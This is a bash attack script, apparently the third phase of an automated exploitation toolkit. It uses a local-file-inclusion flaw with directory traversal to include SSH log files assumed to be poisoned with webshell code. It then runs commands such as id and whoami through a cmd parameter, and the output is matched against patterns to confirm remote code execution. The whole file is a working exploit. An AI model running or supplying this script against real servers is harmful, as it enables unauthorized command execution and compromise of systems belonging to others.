#!/bin/bash
# SSH RCE Trigger -- Phase 3: include poisoned SSH log via LFI to trigger RCE
# 用法: trigger_ssh.sh <ENDPOINT> <TARGET_IP>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"
TARGET_IP="${2:-127.0.0.1}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== SSH Log Poison: RCE Trigger (Phase 3) ==="

CONFIRMED_PARAM="${lfi_param:-}"
CONFIRMED_DEPTH="${lfi_depth:-}"
LFI_STYLE="${lfi_style:-relative}"
LFI_PATH="${lfi_path:-}"
SSH_LOG="${ssh_log_path:-}"
[ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
[ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"

LANG="${webshell_lang:-php}"
if [ "$LANG" = "aspx" ]; then
  CMD_PARAM="cmd=whoami"
  SUCCESS_RE='nt authority|iis apppool|administrator|system32'
else
  CMD_PARAM="cmd=id&c=system('id');"
  SUCCESS_RE='uid=[0-9]+'
fi

build_lfi_url() {
  local target_file="$1"
  if [ "$LFI_STYLE" = "absolute" ]; then
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}/${target_file}&${CMD_PARAM}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=/${target_file}&${CMD_PARAM}"
    fi
  else
    local TRAV
    TRAV=$(printf '../%.0s' $(seq 1 "$CONFIRMED_DEPTH"))
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}${TRAV}${target_file}&${CMD_PARAM}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}&${CMD_PARAM}"
    fi
  fi
}

if [ -n "$SSH_LOG" ]; then
  TARGETS="$SSH_LOG"
else
  TARGETS="var/log/auth.log var/log/secure var/log/sshd.log var/log/messages var/log/syslog"
fi

for logpath in $TARGETS; do
  url=$(build_lfi_url "$logpath")
  echo "[TRIGGER] $url"
  result=$(curl -s "$url" --max-time 10 2>/dev/null)
  if echo "$result" | grep -qiE "$SUCCESS_RE"; then
    echo "[HIT] SSH_LOG_POISON_RCE via $logpath"
    echo "$result" | grep -iE "$SUCCESS_RE" | head -3
    exit 0
  fi
  echo "[MISS] $logpath (${#result}B)"
done
echo "SSH_LOG_POISON_TRIGGER_FAILED"
